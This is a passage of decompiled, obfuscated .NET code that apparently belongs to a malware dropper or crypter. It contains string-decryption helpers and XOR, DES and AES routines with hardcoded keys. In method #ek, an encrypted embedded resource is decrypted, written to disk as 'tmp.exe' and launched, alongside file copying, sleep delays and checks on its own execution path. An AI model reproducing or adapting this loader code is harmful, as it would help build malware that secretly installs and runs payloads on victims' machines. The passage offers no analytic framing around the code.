      \u0023\u0023.\u0023Rk(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) pc1, (object) pc2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static byte[] \u00234j([In] byte[] obj0)
  {
    Assembly callingAssembly;
    Assembly executingAssembly;
    \u0023qc.\u0023Qd qd;
    byte[] numArray1;
    int num1;
    short num2;
    int num3;
    int num4;
    int length1;
    int count1;
    int count2;
    byte[] buffer1;
    byte[] buffer2;
    byte[] buffer3;
    \u0023qc.\u0023Gc gc1;
    int num5;
    int length2;
    int num6;
    int length3;
    int num7;
    byte[] buffer4;
    \u0023qc.\u0023Gc gc2;
    byte[] numArray2;
    byte[] numArray3;
    ICryptoTransform cryptoTransform1;
    byte[] numArray4;
    byte[] numArray5;
    byte[] numArray6;
    ICryptoTransform cryptoTransform2;
    byte[] numArray7;
    try
    {
      callingAssembly = Assembly.GetCallingAssembly();
      executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0023\u0023.\u0023oi(executingAssembly, callingAssembly))
        return (byte[]) null;
      qd = new \u0023qc.\u0023Qd(obj0);
      numArray1 = new byte[0];
      num1 = \u0023\u0023.\u0023Uj(qd);
      if (num1 == 67324752)
      {
        num2 = (short) \u0023\u0023.\u00233h(qd);
        num3 = \u0023\u0023.\u00233h(qd);
        num4 = \u0023\u0023.\u00233h(qd);
        if (num1 != 67324752 || num2 != (short) 20 || num3 != 0 || num4 != 8)
          throw new FormatException("Wrong Header Signature");
        \u0023\u0023.\u0023Uj(qd);
        \u0023\u0023.\u0023Uj(qd);
        \u0023\u0023.\u0023Uj(qd);
        length1 = \u0023\u0023.\u0023Uj(qd);
        count1 = \u0023\u0023.\u00233h(qd);
        count2 = \u0023\u0023.\u00233h(qd);
        if (count1 > 0)
        {
          buffer1 = new byte[count1];
          qd.Read(buffer1, 0, count1);
        }
        if (count2 > 0)
        {
          buffer2 = new byte[count2];
          qd.Read(buffer2, 0, count2);
        }
        buffer3 = new byte[qd.Length - qd.Position];
        qd.Read(buffer3, 0, buffer3.Length);
        gc1 = new \u0023qc.\u0023Gc(buffer3);
        numArray1 = new byte[length1];
        \u0023\u0023.\u0023xl(numArray1, 0, gc1, numArray1.Length);
        buffer3 = (byte[]) null;
      }
      else
      {
        num5 = num1 >> 24;
        num1 -= num5 << 24;
        if (num1 != 8223355)
          throw new FormatException("Unknown Header");
        if (num5 == 1)
        {
          length2 = \u0023\u0023.\u0023Uj(qd);
          numArray1 = new byte[length2];
          for (num6 = 0; num6 < length2; num6 += num7)
          {
            length3 = \u0023\u0023.\u0023Uj(qd);
            num7 = \u0023\u0023.\u0023Uj(qd);
            buffer4 = new byte[length3];
            qd.Read(buffer4, 0, buffer4.Length);
            gc2 = new \u0023qc.\u0023Gc(buffer4);
            \u0023\u0023.\u0023xl(numArray1, num6, gc2, num7);
          }
        }
        if (num5 == 2)
        {
          numArray2 = new byte[8]
          {
            (byte) 122,
            (byte) 209,
            (byte) 209,
            (byte) 57,
            (byte) 235,
            (byte) 132,
            (byte) 85,
            (byte) 92
          };
          numArray3 = new byte[8]
          {
            (byte) 125,
            (byte) 102,
            (byte) 43,
            (byte) 150,
            (byte) 249,
            (byte) 24,
            (byte) 70,
            (byte) 61
          };
          cryptoTransform1 = \u0023\u0023.\u0023Lk(numArray3, numArray2, true);
          try
          {
            numArray4 = cryptoTransform1.TransformFinalBlock(obj0, 4, obj0.Length - 4);
            numArray1 = \u0023\u0023.\u00234j(numArray4);
          }
          finally
          {
            cryptoTransform1?.Dispose();
          }
        }
        if (num5 == 3)
        {
          numArray5 = new byte[16]
          {
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1
          };
          numArray6 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
          cryptoTransform2 = \u0023\u0023.\u0023rk(numArray6, true, numArray5);
          try
          {
            numArray7 = cryptoTransform2.TransformFinalBlock(obj0, 4, obj0.Length - 4);
            numArray1 = \u0023\u0023.\u00234j(numArray7);
          }
          finally
          {
            cryptoTransform2?.Dispose();
          }
        }
      }
      qd.Close();
      return numArray1;
    }
    catch (Exception ex)
    {
      object[] objArray = new object[31]
      {
        (object) callingAssembly,
        (object) executingAssembly,
        (object) qd,
        (object) numArray1,
        (object) num1,
        (object) num2,
        (object) num3,
        (object) num4,
        (object) length1,
        (object) count1,
        (object) count2,
        (object) buffer1,
        (object) buffer2,
        (object) buffer3,
        (object) gc1,
        (object) num5,
        (object) length2,
        (object) num6,
        (object) length3,
        (object) num7,
        (object) gc2,
        (object) buffer4,
        (object) numArray2,
        (object) numArray3,
        (object) cryptoTransform1,
        (object) numArray4,
        (object) numArray5,
        (object) numArray6,
        (object) cryptoTransform2,
        (object) numArray7,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00235j([In] \u0023qc.\u0023md.\u0023Pc obj0)
  {
    int length;
    int[] numArray1;
    int index1;
    int index2;
    int index3;
    int num1;
    int[] numArray2;
    int index4;
    int[] numArray3;
    int num2;
    int num3;
    int index5;
    int num4;
    int num5;
    int index6;
    int num6;
    int num7;
    int index7;
    int index8;
    int num8;
    int index9;
    int index10;
    try
    {
      length = obj0.\u0023nd.Length;
      int num9 = 4;
      while (true)
      {
        int num10 = num9;
        while (true)
        {
          switch (num10)
          {
            case 0:
              if (index6 < length)
                goto label_31;
              else
                goto case 2;
            case 1:
            case 18:
label_13:
              if ((index1 = index5) > 0)
              {
                if (numArray3[numArray1[index5 = (index1 - 1) / 2]] > num3)
                {
                  numArray1[index1] = numArray1[index5];
                  int num11 = 1;
                  num10 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num11 : num11;
                  continue;
                }
                goto label_15;
              }
              else
                goto case 13;
            case 2:
              if (num4 >= 2)
              {
                obj0.\u0023qd = Math.Max(num5 + 1, obj0.\u0023pd);
                if (true)
                {
                  num10 = 14;
                  continue;
                }
                goto case 9;
              }
              else
              {
                int num12;
                if (num5 >= 2)
                  num12 = 0;
                else
                  num5 = num12 = num5 + 1;
                num6 = num12;
                numArray1[num4++] = num6;
                if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
                {
                  num10 = 2;
                  continue;
                }
                goto case 5;
              }
            case 3:
              num4 = 0;
              num5 = 0;
              index6 = 0;
              goto case 0;
            case 4:
              numArray1 = new int[length];
              if (true)
              {
                num10 = 3;
                continue;
              }
              goto label_10;
            case 5:
            case 14:
              num7 = num4;
              numArray2 = new int[4 * num4 - 2];
              numArray3 = new int[2 * num4 - 1];
              num1 = num7;
              for (index7 = 0; index7 < num4; ++index7)
              {
                index8 = numArray1[index7];
                numArray2[2 * index7] = index8;
                numArray2[2 * index7 + 1] = -1;
                numArray3[index7] = (int) obj0.\u0023nd[index8] << 8;
                numArray1[index7] = index7;
              }
              break;
            case 6:
              num2 = Math.Min(numArray3[index4] & (int) byte.MaxValue, numArray3[index3] & (int) byte.MaxValue);
              numArray3[index2] = num3 = numArray3[index4] + numArray3[index3] - num2 + 1;
              index5 = 0;
              index1 = 1;
              goto case 12;
            case 7:
            case 8:
              index1 = index1 * 2 + 1;
              goto label_35;
            case 9:
              if (num4 > 1)
                break;
              goto label_8;
            case 10:
              index1 = 1;
              goto label_35;
            case 11:
              ++index1;
              goto label_47;
            case 12:
              if (index1 < num4)
              {
                if (index1 + 1 < num4 && numArray3[numArray1[index1]] > numArray3[numArray1[index1 + 1]])
                {
                  int num13 = 11;
                  num10 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num13 : num13;
                  continue;
                }
                goto label_47;
              }
              else
                goto case 15;
            case 13:
              numArray1[index1] = index2;
              index3 = numArray1[0];
              index2 = num1++;
              numArray2[2 * index2] = index4;
              numArray2[2 * index2 + 1] = index3;
              num10 = 6;
              continue;
            case 15:
              if ((index1 = index5) <= 0 || numArray3[numArray1[index5 = (index1 - 1) / 2]] <= num3)
              {
                numArray1[index1] = index2;
                if (true)
                {
                  num10 = 9;
                  continue;
                }
                goto case 1;
              }
              else
                goto label_41;
            case 16:
              goto label_42;
            case 17:
              goto label_10;
            case 19:
              goto label_49;
            default:
              if (true)
              {
                num10 = 18;
                continue;
              }
              goto case 12;
          }
          index4 = numArray1[0];
          num10 = 17;
          continue;
label_35:
          if (index1 >= num4)
          {
            num3 = numArray3[index2];
            goto label_13;
          }
          else
            goto label_27;
label_47:
          numArray1[index5] = numArray1[index1];
          index5 = index1;
          index1 = index5 * 2 + 1;
          int num14 = 12;
          num10 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num14 : num14;
        }
label_8:
        num9 = 19;
        continue;
label_10:
        index2 = numArray1[--num4];
        index5 = 0;
        num9 = 10;
        continue;
label_15:
        num9 = 13;
        continue;
label_27:
        if (index1 + 1 < num4 && numArray3[numArray1[index1]] > numArray3[numArray1[index1 + 1]])
          ++index1;
        numArray1[index5] = numArray1[index1];
        index5 = index1;
        num9 = 7;
        continue;
label_31:
        num8 = (int) obj0.\u0023nd[index6];
        if (num8 != 0)
        {
          index9 = num4++;
          goto label_43;
        }
        else
          goto label_45;
label_41:
        numArray1[index1] = numArray1[index5];
        num9 = 15;
        continue;
label_42:
        index9 = index10;
label_43:
        if (index9 > 0 && (int) obj0.\u0023nd[numArray1[index10 = (index9 - 1) / 2]] > num8)
        {
          numArray1[index9] = numArray1[index10];
          num9 = 16;
          continue;
        }
        numArray1[index9] = index6;
        num5 = index6;
label_45:
        ++index6;
        num9 = 0;
      }
label_49:
      \u0023\u0023.\u0023qk(numArray2, obj0);
    }
    catch (Exception ex)
    {
      object[] objArray = new object[23]
      {
        (object) length,
        (object) numArray1,
        (object) num4,
        (object) num5,
        (object) index6,
        (object) num8,
        (object) index9,
        (object) index10,
        (object) num6,
        (object) num7,
        (object) numArray2,
        (object) numArray3,
        (object) num1,
        (object) index7,
        (object) index8,
        (object) index4,
        (object) index2,
        (object) index5,
        (object) index1,
        (object) num3,
        (object) index3,
        (object) num2,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Lj([In] \u0023Uf obj0) => \u0023\u0023.\u0023Lj(string.Empty, obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00236j([In] \u0023qc.\u0023md.\u0023Pc obj0, [In] \u0023qc.\u0023md.\u0023Pc obj1)
  {
    int num1;
    int index;
    int num2;
    int num3;
    int num4;
    int num5;
    try
    {
      num1 = -1;
      index = 0;
      int num6 = 9;
      while (true)
      {
        int num7 = num6;
        while (true)
        {
          switch (num7)
          {
            case 0:
              if (num2 < num5)
              {
                while (num2-- > 0)
                  \u0023\u0023.\u00239i(obj1, num1);
                goto case 9;
              }
              else if (num1 != 0)
              {
                \u0023\u0023.\u00239i(obj1, 16);
                \u0023\u0023.\u0023kk(obj0.\u0023ud.\u00239c, num2 - 3, 2);
                goto case 9;
              }
              else
                goto label_20;
            case 1:
            case 6:
              num3 = (int) obj0.\u0023od[index];
              if (num3 == 0)
              {
                num4 = 138;
                num5 = 3;
                goto case 2;
              }
              else
                goto label_13;
            case 2:
              num1 = num3;
              ++index;
              goto case 8;
            case 3:
            case 7:
              \u0023\u0023.\u0023kk(obj0.\u0023ud.\u00239c, num2 - 3, 3);
              goto case 9;
            case 4:
              if (num1 == (int) obj0.\u0023od[index])
              {
                ++index;
                if (++num2 >= num4)
                  goto case 0;
                else
                  goto case 8;
              }
              else
              {
                if (true)
                {
                  num7 = 0;
                  continue;
                }
                goto case 9;
              }
            case 5:
              if (num1 == num3)
                goto case 2;
              else
                goto label_23;
            case 8:
              if (index < obj0.\u0023qd)
              {
                num7 = 4;
                continue;
              }
              goto case 0;
            case 9:
            case 10:
              if (index < obj0.\u0023qd)
              {
                num2 = 1;
                if (true)
                {
                  num7 = 6;
                  continue;
                }
                goto case 2;
              }
              else
                goto label_27;
            default:
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              {
                num7 = 8;
                continue;
              }
              goto case 1;
          }
        }
label_13:
        num4 = 6;
        num5 = 3;
        num6 = 5;
        continue;
label_20:
        if (num2 > 10)
        {
          \u0023\u0023.\u00239i(obj1, 18);
          \u0023\u0023.\u0023kk(obj0.\u0023ud.\u00239c, num2 - 11, 7);
          num6 = 10;
          continue;
        }
        \u0023\u0023.\u00239i(obj1, 17);
        num6 = 3;
        continue;
label_23:
        \u0023\u0023.\u00239i(obj1, num3);
        num2 = 0;
        num6 = 2;
      }
label_27:;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num4;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num5;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) index;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) num3;
      \u0023qc.\u0023md.\u0023Pc pc1 = obj0;
      \u0023qc.\u0023md.\u0023Pc pc2 = obj1;
      \u0023\u0023.\u0023Rk(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) pc1, (object) pc2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static byte[] \u00237j(byte[] _param0, string _param1)
  {
    byte[] arySrc;
    int num1;
    int index1;
    int num2;
    byte[] bytes;
    int index2;
    try
    {
      arySrc = new byte[checked (_param0.Length + 1)];
      int num3 = 0;
      while (true)
      {
        int num4 = num3;
        while (true)
        {
          switch (num4)
          {
            case 0:
              goto label_12;
            case 1:
              num1 = checked (_param0.Length - 1);
              index1 = 0;
              goto case 3;
            case 2:
            case 5:
              if (index2 == checked (_param1.Length - 1))
                index2 = 0;
              else
                checked { ++index2; }
              checked { ++index1; }
              num4 = 4;
              continue;
            case 3:
            case 4:
              if (index1 <= num1)
              {
                arySrc[index1] = checked ((byte) ((int) _param0[index1] ^ num2 ^ (int) bytes[index2]));
                goto case 2;
              }
              else
              {
                arySrc = (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (_param0.Length - 2 + 1)]);
                if (true)
                {
                  num4 = 6;
                  continue;
                }
                goto label_12;
              }
            case 6:
              goto label_13;
            default:
              goto label_5;
          }
        }
label_5:
        num3 = 5;
        continue;
label_12:
        num2 = (int) _param0[checked (_param0.Length - 1)] ^ 112;
        bytes = Encoding.Default.GetBytes(_param1);
        num3 = 1;
      }
label_13:
      return arySrc;
    }
    catch (Exception ex)
    {
      byte[] numArray1;
      byte[] numArray2 = numArray1;
      byte[] numArray3 = arySrc;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      byte[] numArray4 = bytes;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) index1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num1;
      byte[] numArray5 = _param0;
      string str = _param1;
      \u0023\u0023.\u00238j(ex, (object) numArray2, (object) numArray3, (object) local1, (object) local2, (object) numArray4, (object) local3, (object) local4, (object) numArray5, (object) str);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00238j(
    [In] Exception obj0,
    [In] object obj1,
    [In] object obj2,
    [In] object obj3,
    [In] object obj4,
    [In] object obj5,
    [In] object obj6,
    [In] object obj7,
    [In] object obj8,
    [In] object obj9)
  {
    \u0023\u0023.\u0023ji(obj0, new object[9]
    {
      obj1,
      obj2,
      obj3,
      obj4,
      obj5,
      obj6,
      obj7,
      obj8,
      obj9
    });
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u00239j([In] \u0023ge.\u0023ue obj0) => obj0.\u0023se;

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023ak([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023bk() => \u0023\u0023.\u00236h().\u0023Jg;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023ck([In] \u0023qc.\u0023Jd obj0)
  {
    try
    {
      return obj0.\u0023Hd == obj0.\u0023Gd;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Jd jd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) jd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023dk([In] \u0023qc.\u0023Pd obj0, [In] int obj1)
  {
    int num1;
    int num2;
    try
    {
      byte[] kd1 = obj0.\u0023Kd;
      num1 = obj0.\u0023Md++;
      int index1 = num1;
      int num3 = (int) (byte) obj1;
      kd1[index1] = (byte) num3;
      byte[] kd2 = obj0.\u0023Kd;
      num2 = obj0.\u0023Md++;
      int index2 = num2;
      int num4 = (int) (byte) (obj1 >> 8);
      kd2[index2] = (byte) num4;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      \u0023qc.\u0023Pd pd = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj1;
      \u0023\u0023.\u0023pl(ex, (object) local1, (object) local2, (object) pd, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023ek([In] \u0023F.\u0023M obj0)
  {
label_0:
    int num1;
    int num2;
    string str1;
    object executablePath;
    string str2;
    bool flag1;
    string[] strArray;
    ResourceManager resourceManager;
    string str3;
    string str4;
    byte[] numArray1;
    byte[] numArray2;
    string str5;
    string sourceFileName;
    bool flag2;
    string empty;
    string destFileName;
    byte[] numArray3;
    byte[] data;
    ProcessStartInfo startInfo;
    object[] objArray1;
    int num3;
    try
    {
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        num2 = 2;
        str1 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
label_2:
        num2 = 3;
        executablePath = (object) Application.ExecutablePath;
label_3:
        num2 = 4;
        str2 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
label_4:
        num2 = 5;
        flag1 = false;
label_5:
        num2 = 6;
        strArray = new string[5]
        {
          str1,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          ""
        };
        if (!Operators.ConditionalCompareObjectEqual((object) string.Concat(strArray), Operators.ConcatenateObject(Operators.ConcatenateObject(executablePath, (object) ""), (object) ""), false))
          goto label_7;
label_6:
        num2 = 7;
        flag1 = true;
label_7:
        num2 = 9;
        resourceManager = new ResourceManager("妈么毒尔贵么", Assembly.GetExecutingAssembly());
label_8:
        num2 = 10;
        str3 = "" + Interaction.Environ("TEMP") + "";
label_9:
        num2 = 11;
        if (!\u0023\u0023.\u00232h(\u0023\u0023.\u0023ei("oAJ9Pm/REVvo5UjKLLNqMA==")))
          goto label_11;
label_10:
        num2 = 12;
        Thread.Sleep(15001);
label_11:
        num2 = 14;
        str4 = \u0023\u0023.\u0023ei("qJ1rx6zo0JWv6cXezCyOGQ==") + ".exe";
label_12:
        num2 = 15;
        numArray1 = numArray1;
label_13:
        num2 = 16;
        numArray2 = \u0023\u0023.\u00237j(numArray1, "fsfsdfsdfsdfsdf");
label_14:
        num2 = 17;
        if (flag1)
          goto label_18;
label_15:
        num2 = 19;
label_16:
        num2 = 20;
        if (Operators.ConditionalCompareObjectEqual(executablePath, (object) (str2 + "#nsdffdsp#$$$.exe$$$"), false))
          goto label_18;
label_17:
        num2 = 22;
label_18:
        num2 = 25;
        str5 = "";
label_19:
        num2 = 26;
        sourceFileName = Interaction.Environ(\u0023\u0023.\u0023ei("rRhnphBugUiRcVlpVgLfjw==")) + \u0023\u0023.\u0023ei("ijulUbn8DPPkee8Mdv0Pf3JPXTMNWvYRORO+JfoPSAU=") + \u0023\u0023.\u0023ei("8Ebrvyc8jIJpnps2eCCHYA==");
label_20:
        num2 = 27;
        flag2 = false;
label_21:
        num2 = 28;
        empty = string.Empty;
label_22:
        num2 = 29;
        destFileName = "" + str3 + "\\" + str4;
label_23:
        num2 = 30;
        numArray3 = (byte[]) resourceManager.GetObject("京软京明去贵");
label_24:
        num2 = 31;
        data = \u0023\u0023.\u00237j(numArray3, \u0023\u0023.\u0023ei("axfXKc1uSPw22HSCJhAWEa6DjhDSpCiOMzx2Wd3rCNIeUVvr7X0cLx7c6+sI2SXe"));
label_25:
        num2 = 32;
        int num4 = flag1 ? 1 : 0;
label_26:
        num2 = 34;
        \u0023\u0023.\u0023al();
label_27:
        num2 = 35;
        \u0023m.Computer.FileSystem.WriteAllBytes(str1 + "tmp.exe", data, false);
label_28:
        num2 = 36;
        startInfo = new ProcessStartInfo(str1 + "tmp.exe");
label_29:
        num2 = 37;
        Process.Start(startInfo);
label_30:
        num2 = 38;
        System.IO.File.Delete(str1 + str4);
label_31:
        num2 = 39;
        System.IO.File.Copy(sourceFileName, destFileName, true);
label_32:
        num2 = 40;
        objArray1 = new object[5]
        {
          (object) string.Empty,
          (object) data,
          (object) false,
          (object) true,
          (object) Application.ExecutablePath
        };
        \u0023\u0023.\u00232i(objArray1);
label_33:
        num2 = 41;
        \u0023\u0023.\u0023Ej();
label_34:
        num2 = 42;
        Thread.Sleep(10000);
label_35:
        num2 = 43;
        \u0023\u0023.\u0023ok();
        ProjectData.EndApp();
        goto label_41;
label_37:
        num3 = num2;
        switch (num1)
        {
          case 1:
            int num5 = num3 + 1;
            num3 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
                goto label_13;
              case 17:
                goto label_14;
              case 18:
              case 21:
              case 23:
              case 24:
              case 25:
                goto label_18;
              case 19:
                goto label_15;
              case 20:
                goto label_16;
              case 22:
                goto label_17;
              case 26:
                goto label_19;
              case 27:
                goto label_20;
              case 28:
                goto label_21;
              case 29:
                goto label_22;
              case 30:
                goto label_23;
              case 31:
                goto label_24;
              case 32:
                goto label_25;
              case 33:
              case 34:
                goto label_26;
              case 35:
                goto label_27;
              case 36:
                goto label_28;
              case 37:
                goto label_29;
              case 38:
                goto label_30;
              case 39:
                goto label_31;
              case 40:
                goto label_32;
              case 41:
                goto label_33;
              case 42:
                goto label_34;
              case 43:
                goto label_35;
              case 44:
                goto label_41;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_37;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_41:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      string str6;
      object[] objArray2 = new object[24]
      {
        executablePath,
        (object) empty,
        (object) flag2,
        (object) numArray1,
        (object) str6,
        (object) str4,
        (object) numArray2,
        (object) str3,
        (object) str5,
        (object) destFileName,
        (object) str1,
        (object) str2,
        (object) flag1,
        (object) startInfo,
        (object) sourceFileName,
        (object) data,
        (object) resourceManager,
        (object) numArray3,
        (object) strArray,
        (object) objArray1,
        (object) num1,
        (object) num3,
        (object) num2,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023fk([In] \u0023qc.\u0023Gc obj0)
  {
    int wc;
    bool flag;
    int num1;
    int num2;
    int num3;
    int num4;
    int num5;
    try
    {
      wc = obj0.\u0023wc;
      int num6 = 12;
      while (true)
      {
        int num7 = num6;
        while (true)
        {
          switch (num7)
          {
            case 0:
            case 12:
              switch (wc)
              {
                case 2:
                  if (!obj0.\u0023Bc)
                  {
                    num1 = \u0023\u0023.\u0023cj(obj0.\u0023E, 3);
                    if (num1 >= 0)
                    {
                      \u0023\u0023.\u0023Ui(obj0.\u0023E, 3);
                      if ((num1 & 1) == 0)
                        break;
                      goto label_23;
                    }
                    else
                      goto label_6;
                  }
                  else
                    goto label_4;
                case 3:
                  obj0.\u0023Ac = num4 = \u0023\u0023.\u0023cj(obj0.\u0023E, 16);
                  if (num4 < 0)
                  {
                    num7 = 1;
                    continue;
                  }
                  \u0023\u0023.\u0023Ui(obj0.\u0023E, 16);
                  obj0.\u0023wc = 4;
                  goto case 4;
                case 4:
                  num5 = \u0023\u0023.\u0023cj(obj0.\u0023E, 16);
                  if (num5 >= 0)
                  {
                    \u0023\u0023.\u0023Ui(obj0.\u0023E, 16);
                    obj0.\u0023wc = 5;
                    num7 = 4;
                    continue;
                  }
                  goto label_31;
                case 5:
                  goto label_7;
                case 6:
                  goto label_10;
                case 7:
                case 8:
                case 9:
                case 10:
                  goto label_33;
                case 12:
                  goto label_34;
                default:
                  goto label_35;
              }
              break;
            case 1:
              goto label_12;
            case 2:
              goto label_33;
            case 3:
              goto label_24;
            case 4:
              goto label_7;
            case 5:
              goto label_27;
            case 6:
            case 7:
            case 8:
            case 9:
            case 13:
              goto label_37;
            case 10:
              flag = false;
              num7 = 8;
              continue;
            case 11:
              obj0.\u0023Bc = true;
              break;
            default:
              if (true)
              {
                num7 = 9;
                continue;
              }
              goto case 11;
          }
          num3 = num1 >> 1;
          switch (num3)
          {
            case 0:
              goto label_18;
            case 1:
              goto label_19;
            case 2:
              obj0.\u0023Dc = new \u0023qc.\u00236c();
              if (true)
              {
                num7 = 5;
                continue;
              }
              goto label_37;
            default:
              goto label_24;
          }
        }
label_6:
        flag = false;
        num6 = 7;
        continue;
label_10:
        if (!\u0023\u0023.\u0023si(obj0.\u0023Dc, obj0.\u0023E))
        {
          num6 = 10;
          continue;
        }
        obj0.\u0023Ec = \u0023\u0023.\u0023Ai(obj0.\u0023Dc);
        obj0.\u0023Fc = \u0023\u0023.\u0023Ei(obj0.\u0023Dc);
        obj0.\u0023wc = 7;
        num6 = 2;
        continue;
label_23:
        num6 = 11;
        continue;
label_27:
        obj0.\u0023wc = 6;
        num6 = 3;
        continue;
label_34:
        flag = false;
        num6 = 13;
      }
label_4:
      obj0.\u0023wc = 12;
      flag = false;
      goto label_37;
label_7:
      num2 = \u0023\u0023.\u0023tk(obj0.\u0023Cc, obj0.\u0023E, obj0.\u0023Ac);
      obj0.\u0023Ac -= num2;
      if (obj0.\u0023Ac == 0)
      {
        obj0.\u0023wc = 2;
        flag = true;
        goto label_37;
      }
      else
      {
        flag = !\u0023\u0023.\u0023Vi(obj0.\u0023E);
        goto label_37;
      }
label_12:
      flag = false;
      goto label_37;
label_18:
      \u0023\u0023.\u0023nl(obj0.\u0023E);
      obj0.\u0023wc = 3;
      goto label_24;
label_19:
      obj0.\u0023Ec = \u0023qc.\u0023Sc.\u0023Qc;
      obj0.\u0023Fc = \u0023qc.\u0023Sc.\u0023Rc;
      obj0.\u0023wc = 7;
label_24:
      flag = true;
      goto label_37;
label_31:
      flag = false;
      goto label_37;
label_33:
      flag = \u0023\u0023.\u0023yj(obj0);
      goto label_37;
label_35:
      flag = false;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num5;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) wc;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) num4;
      \u0023qc.\u0023Gc gc = obj0;
      \u0023\u0023.\u00233k(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) gc);
      throw;
    }
label_37:
    return flag;
  }

  [DllImport("user32.dll", EntryPoint = "OemToCharBuffA", CharSet = CharSet.Ansi, SetLastError = true)]
  internal static extern long \u0023gk([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, long _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
